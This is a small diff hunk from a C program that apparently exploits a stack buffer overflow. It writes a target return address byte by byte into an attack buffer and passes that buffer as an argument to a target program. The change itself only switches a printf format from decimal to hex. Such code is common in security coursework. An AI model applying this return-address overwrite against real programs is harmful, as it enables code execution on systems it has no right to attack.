@@ -32,7 +32,7 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0xff);
 	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0xff);
 
-	printf("&attack_buffer[120] as hex: %u\n",attack_buffer[BUF_TO_RET]);
+	printf("&attack_buffer[120] as hex: %x\n",attack_buffer[BUF_TO_RET]);
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
